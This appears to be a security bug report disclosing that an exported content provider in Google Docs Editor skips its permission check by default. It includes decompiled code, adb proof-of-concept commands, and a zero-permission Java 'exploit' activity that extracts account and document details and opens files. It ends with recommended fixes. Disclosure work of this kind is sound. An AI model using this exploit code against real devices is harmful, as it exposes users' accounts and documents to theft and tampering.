# VRP Report #36: Google Docs Editor LegacyStorageBackendContentProvider — Phenotype Flag Bypass of Permission Check

## Summary
The `LegacyStorageBackendContentProvider` in Google Docs Editor is exported without any permission restriction. Its `call()` and `openFile()` methods contain a permission check (`checkCallingUriPermission`) that is gated behind a Phenotype (server-side config) flag `45793750`, which defaults to `false`. When the flag is false (the default), the permission check is completely skipped, allowing a zero-permission malicious app to read Google Drive document metadata (resource IDs, HTML URIs, display names, MIME types) and potentially read/write document file content.

## Affected Component
- **App**: Google Docs Editor (`com.google.android.apps.docs.editors.docs`)
- **Component**: `com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider`
- **Type**: ContentProvider
- **Exported**: true (AndroidManifest.xml line 339)
- **Permission**: NONE
- **Authority**: `com.google.android.apps.docs.editors.kix.storage.legacy`

## Vulnerability Details

### Manifest Declaration
```xml
<provider
    android:authorities="com.google.android.apps.docs.editors.kix.storage.legacy"
    android:exported="true"
    android:name="com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider"/>
```

No `android:permission`, `android:readPermission`, or `android:writePermission` attribute.

### Phenotype Flag Gate (aqyc.java)
```java
public final class aqyc implements aqyb {
    private static final tpp a;

    static {
        tpk tpkVar = (tpk) aqxb.a;
        a = new tpj.a(tpkVar.a, "45793750", tpkVar.b, false);  // DEFAULT: false
    }

    @Override
    public final boolean a() {
        ?? r3 = a;
        Object objH = ((tpj) r3).h(r3, toq.a(), "");
        return ((Boolean) objH).booleanValue();
    }
}
```

The flag `45793750` initializes with default value `false`. Until Google pushes a server-side config to change it, the flag returns `false`.

### call() method (LegacyStorageBackendContentProvider.java lines 170-239)

```java
public final Bundle call(String str, String str2, Bundle bundle) {
    // ...
    Uri uri = (Uri) bundle.getParcelable("android.intent.extra.STREAM");
    
    // LINE 181: Permission check ONLY when flag is TRUE
    if (((aqyb) ((anza) aqya.a.b).a).a() && uri != null 
        && getContext().checkCallingUriPermission(uri, 1) != 0) {
        throw new SecurityException("Permission denied for " + uri.toString());
    }
    
    // When flag is FALSE (default), execution continues here WITHOUT any check
    
    // Ordinal 0 ("getItemInfo"):
    Bundle bundle2 = new Bundle();
    bundle2.putString("accountName", ijdVar.t().a);     // Google account name
    bundle2.putString("resourceId", ijdVar.h());          // Drive resource ID
    bundle2.putString("htmlUri", ijdVar.b());             // Direct HTML URI
    bundle2.putString("_display_name", ijdVar.V());       // Document name
    bundle2.putString("mimeType", ijdVar.Q());            // MIME type
    return bundle2;
    
    // Ordinal 1: Returns Intent to DetailsPanelActivity with entrySpec
}
```

### openFile() method (LegacyStorageBackendContentProvider.java lines 298-340)

```java
public final ParcelFileDescriptor openFile(Uri uri, String str) throws IOException {
    // LINE 303: Permission check ONLY when flag is TRUE
    if (((aqyb) ((anza) aqya.a.b).a).a()) {
        boolean zContains = str.contains("r");
        int i = zContains;
        if (str.contains("w")) {
            i = (zContains ? 1 : 0) | 2;
        }
        if (getContext().checkCallingUriPermission(uri, i) != 0) {
            throw new SecurityException("Permission denied for " + uri);
        }
    }
    // When flag is FALSE (default), NO permission check at all
    // Supports both "r" (read) and "w" (write) modes
    
    // Read: returns ParcelFileDescriptor for the Drive document
    // Write: creates a pipe and uploads content to Drive
}
```

## Proof of Concept

### Via ADB (testing):
```bash
# Query document metadata — requires a known document URI
adb shell content call \
  --uri content://com.google.android.apps.docs.editors.kix.storage.legacy/test \
  --method getItemInfo \
  --extra android.intent.extra.STREAM:p:content://com.google.android.apps.docs.editors.kix.storage.legacy/DOCUMENT_ID

# Open file for reading
adb shell content open \
  content://com.google.android.apps.docs.editors.kix.storage.legacy/DOCUMENT_ID \
  --mode r
```

### Via malicious app (zero permissions):
```java
public class DocsExploitActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Build the content URI for a known document
        Uri targetUri = Uri.parse(
            "content://com.google.android.apps.docs.editors.kix.storage.legacy/DOCUMENT_ID");
        
        // Method 1: Get document metadata
        Bundle extras = new Bundle();
        extras.putParcelable("android.intent.extra.STREAM", targetUri);
        
        Bundle result = getContentResolver().call(
            Uri.parse("content://com.google.android.apps.docs.editors.kix.storage.legacy"),
            "getItemInfo",  // ordinal 0
            null,
            extras);
        
        if (result != null) {
            String accountName = result.getString("accountName");
            String resourceId = result.getString("resourceId");
            String htmlUri = result.getString("htmlUri");
            String displayName = result.getString("_display_name");
            String mimeType = result.getString("mimeType");
            Log.d("EXPLOIT", "Account: " + accountName);
            Log.d("EXPLOIT", "Resource ID: " + resourceId);
            Log.d("EXPLOIT", "HTML URI: " + htmlUri);
            Log.d("EXPLOIT", "Name: " + displayName);
        }
        
        // Method 2: Read document file content
        try {
            ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(
                targetUri, "r");
            // Read the document content from pfd
        } catch (Exception e) {
            Log.e("EXPLOIT", "openFile failed: " + e.getMessage());
        }
    }
}
```

## Impact

### Document Metadata Leak (HIGH)
- **accountName**: Leaks the user's Google account email address
- **resourceId**: Leaks the Google Drive document resource ID (can be used to construct URLs to access the document)
- **htmlUri**: Leaks direct HTML access URI to the document
- **_display_name**: Leaks document title/name
- **mimeType**: Leaks document type

### Document Content Access (CRITICAL if URI scheme is predictable)
- `openFile()` with mode "r" returns a `ParcelFileDescriptor` with the document content
- `openFile()` with mode "w" allows WRITING to the document
- If document URIs follow a predictable pattern, an attacker could read/write ANY Google Drive document the user has open in Docs

### Attack Scenarios
1. **Corporate espionage**: A malicious app installed on a target's phone enumerates and reads confidential documents
2. **Document tampering**: A zero-permission app silently modifies document content via write mode
3. **Account discovery**: Leak the user's Google account email without any permission

## Why This Is Not a Theoretical Bug
- The Phenotype flag `45793750` defaults to `false` in the app code (aqyc.java line 12)
- The ContentProvider is exported with NO permission in the manifest
- The permission check (`checkCallingUriPermission`) is THE ONLY security gate, and it's disabled by default
- The code clearly shows the developers intended to add this check but made it opt-in via a config flag rather than opt-out

## Severity Assessment
- **Confidentiality**: HIGH (document content + metadata + account email leaked)
- **Integrity**: HIGH (document content can be modified via write mode)
- **Availability**: Not affected
- **User Interaction**: NONE (zero-click, fully automated)
- **Permissions Required**: NONE (zero permissions)
- **Attack Complexity**: LOW (standard ContentProvider API calls)

## Fix Recommendation

### Option 1: Remove the flag gate (recommended)
Always enforce the permission check:
```java
// Remove the flag check, always verify permissions
if (uri != null && getContext().checkCallingUriPermission(uri, 1) != 0) {
    throw new SecurityException("Permission denied for " + uri);
}
```

### Option 2: Add manifest-level permission
```xml
<provider
    android:authorities="com.google.android.apps.docs.editors.kix.storage.legacy"
    android:exported="true"
    android:readPermission="com.google.android.apps.docs.permission.READ_STORAGE"
    android:writePermission="com.google.android.apps.docs.permission.WRITE_STORAGE"
    android:name="...LegacyStorageBackendContentProvider"/>
```

### Option 3: Make it non-exported
If this provider only serves internal app components:
```xml
<provider android:exported="false" .../>
```

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- Google Docs Editor as bundled
